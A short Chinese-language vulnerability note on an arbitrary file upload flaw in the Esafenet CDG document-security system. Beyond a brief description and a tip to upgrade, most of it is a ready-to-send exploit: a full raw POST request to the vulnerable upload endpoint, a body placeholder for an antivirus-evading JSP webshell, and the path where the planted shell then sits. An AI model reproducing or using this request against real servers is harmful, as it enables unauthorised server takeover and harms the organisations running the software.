漏洞描述:亿赛通电子文档安全管理系统(简称:CDG)是一款电子文档安全防护软件。亿赛通电子文档安全管理系统任意文件上传
漏洞危害:攻击者可以上传恶意文件，获得服务器权限修复方法
官网已发布安全修复版本，请升级至官网最新版本
https://www.esafenet.com/


POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCJIIPAFACIJKGABAFFDEDCAHOALGIGLKBFIFBFCGGBJFOGEGG HTTP/1.1
Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/75.0.3770.142 Safari/537.36 Hutool
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Content-Length: 1782
Content-Type: application/xml;charset=UTF-8
Cookie: JSESSIONID=A0OE152C6F1163D70C172BDCF32D9880
Cache-Control: no-cache
Pragma: no-cache
Host: 192.168.80.9:8443
Connection: close

{data区 替换为待上传的文件 如jsp免杀马等}


shell路径
https://*.*.*.*/CDGServer3/favicat.jsp